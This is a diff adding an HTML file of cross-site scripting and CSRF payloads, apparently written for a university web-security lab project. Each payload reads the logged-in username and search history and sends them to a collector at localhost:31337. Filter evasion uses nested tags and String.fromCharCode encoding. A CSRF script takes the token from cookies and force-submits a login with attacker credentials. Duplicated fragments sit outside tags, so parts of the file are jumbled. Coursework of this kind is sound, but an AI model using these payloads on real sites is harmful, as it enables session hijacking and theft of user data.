@@ -1,0 +1,197 @@
+<!-- Defense 0 -->
+<script>
+    $(document).ready(function(){
+        let cookie = document.getElementById("csrf_token").textContent
+        console.log(cookie)
+        let user = document.getElementById("logged-in-user").innerText 
+        console.log(user)
+        console.log(document.getElementsByClassName("list-group"))
+        let recentHistory = document.getElementsByClassName("list-group")[0]
+        console.log(recentHistory)
+        let nodes = recentHistory.childNodes
+        let text = nodes[3].innerText
+        console.log(text)
+        let string = "http://localhost:31337/?stolen_user=" + user + "&last_search=" + text
+        $.get(string)
+    })
+</script>
+
+<!-- Defense 1 -->
+<body onload="($(document).ready(function() {
+    alert(String.fromCharCode(88,83,83))
+    let user = document.getElementById('logged-in-user').innerText; 
+    console.log(user);
+    let recentHistory = document.getElementsByClassName('list-group')[0].childNodes[3].innerText; 
+    let string = 'http' + ':' + '\\' + 'localhost:31337/?stolen_user=' + user + '&last_search=' + recentHistory;
+    $.get(string);
+    }));">
+</body>
+
+<!-- Defense 2 (input extra <body, so when removed the other <body tag is still there)-->
+<bo<bodydy onload="($(document).ready(function() {
+    let user = document.getElementById('logged-in-user').innerText; 
+    console.log(user);
+    let recentHistory = document.getElementsByClassName('list-group')[0].childNodes[3].innerText; 
+    let string = 'http' + ':' + '\\' + 'localhost:31337/?stolen_user=' + user + '&last_search=' + recentHistory;
+    $.get(string);
+    }));">
+</body>
+
+<scriscriptpt>
+    $(document).ready(function(){
+        console.log(String.fromCharCode(34))
+        let user = document.getElementById("logged-in-user").innerText 
+        console.log(user)
+        console.log(document.getElementsByClassName("list-group"))
+        let recentHistory = document.getElementsByClassName("list-group")[0]
+        console.log(recentHistory)
+        let nodes = recentHistory.childNodes
+        let text = nodes[3].innerText
+        console.log(text)
+        let string = "http://localhost:31337/?stolen_user=" + user + "&last_search=" + text
+        $.get(string)
+    });
+</scriscriptpt>
+
+<!-- Defense 3 -->
+<!-- " => 34
+     ; => 59
+     \ = 92
+     ' = 39
+-->
+<script>
+    $(document).ready(function(){
+        let user = document.getElementById(String.fromCharCode(108,111,103,103,101,100,45,105,110,45,117,115,101,114)).innerText 
+        console.log(user)
+        console.log(document.getElementsByClassName(String.fromCharCode(108,105,115,116,45,103,114,111,117,112)))
+        let recentHistory = document.getElementsByClassName(String.fromCharCode(108,105,115,116,45,103,114,111,117,112))[0]
+        console.log(recentHistory)
+        let nodes = recentHistory.childNodes
+        let text = nodes[3].innerText
+        console.log(text) 
+        $.get(String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 108, 111, 99,97,108, 104, 111, 115, 116, 58, 51, 49, 51, 51, 55, 47, 63, 115, 116, 111, 108, 101, 110, 95, 117, 115, 101, 114, 61,) + user + String.fromCharCode(38, 108, 97, 115, 116, 95,115, 101, 97, 114, 99,104, 61) + text)
+    })
+</script>
+
+
+<!-- CSRF TOKEN ATTACK -->
+<script>
+    $(document).ready(function(){
+        console.log(document.cookie)
+        let token_begin = document.cookie.indexOf('csrf_token=') + 11
+        console.log(token_begin)
+        let token_end = token_begin + 32
+        let token = document.cookie.substring(token_begin,token_end)
+        console.log(token)
+
+        const form = document.createElement('form');
+        form.method = 'post';
+        form.action = 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0';
+        
+        const hiddenField1 = document.createElement('input');
+        hiddenField1.type = 'hidden';
+        hiddenField1.name = 'csrf_token';
+        hiddenField1.value = token;
+        form.appendChild(hiddenField1);
+        
+        const hiddenField2 = document.createElement('input');
+        hiddenField2.type = 'hidden';
+        hiddenField2.name = 'username';
+        hiddenField2.value = 'attacker';
+        form.appendChild(hiddenField2);
+
+        const hiddenField3 = document.createElement('input');
+        hiddenField3.type = 'hidden';
+        hiddenField3.name = 'password';
+        hiddenField3.value = 'l33th4x';
+        form.appendChild(hiddenField3);
+
+        document.body.appendChild(form);
+        form.submit();
+    })
+</script>
+        const form = document.createElement('form');
+        form.method = 'post';
+        form.action = 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0';
+        
+        const hiddenField1 = document.createElement('input');
+        hiddenField1.type = 'hidden';
+        hiddenField1.name = 'csrf_token';
+        hiddenField1.value = token;
+        form.appendChild(hiddenField1);
+        
+        const hiddenField2 = document.createElement('input');
+        hiddenField2.type = 'hidden';
+        hiddenField2.name = 'username';
+        hiddenField2.value = 'attacker';
+        form.appendChild(hiddenField2);
+
+        const hiddenField3 = document.createElement('input');
+        hiddenField3.type = 'hidden';
+        hiddenField3.name = 'password';
+        hiddenField3.value = 'l33th4x';
+        form.appendChild(hiddenField3);
+
+        document.body.appendChild(form);
+        form.submit(); 
+    }) 
+</script>
+        console.log(document.cookie)
+        let token_begin = document.cookie.indexOf('csrf_token=') + 11
+        console.log(token_begin)
+        let token_end = token_begin + 32
+        let token = document.cookie.substring(token_begin,token_end)
+        console.log(token)
+
+        const form = document.createElement('form');
+        form.method = 'post';
+        form.action = 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0';
+        
+        const hiddenField1 = document.createElement('input');
+        hiddenField1.type = 'hidden';
+        hiddenField1.name = 'csrf_token';
+        hiddenField1.value = token;
+        form.appendChild(hiddenField1);
+        
+        const hiddenField2 = document.createElement('input');
+        hiddenField2.type = 'hidden';
+        hiddenField2.name = 'username';
+        hiddenField2.value = 'attacker';
+        form.appendChild(hiddenField2);
+
+        const hiddenField3 = document.createElement('input');
+        hiddenField3.type = 'hidden';
+        hiddenField3.name = 'password';
+        hiddenField3.value = 'l33th4x';
+        form.appendChild(hiddenField3);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        })
+</script>
+
+<!--  
+    console.log("running script")
+
+
+
+    document.forms[1].elements['csrf_token'].value = token
+        document.forms[1].elements['username'].value = "attacker"
+        document.forms[1].elements['password'].value = "l33th4x"
+        document.forms[1].submit(); 
+           
+
+        var changeReq = new XMLHttpRequest();
+        changeReq.open('post', '/login', true);
+        changeReq.send('csrf='+token)
+        <input type="hidden" name="username" value="attacker" />
+            <input type="hidden" name="password" value="l33th4x" />
+ 
+        $.post('https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0', {
+            "csrf_token": token,
+            "username": "attacker",
+            "password": "l33th4x"
+        })
+    })
+    -->
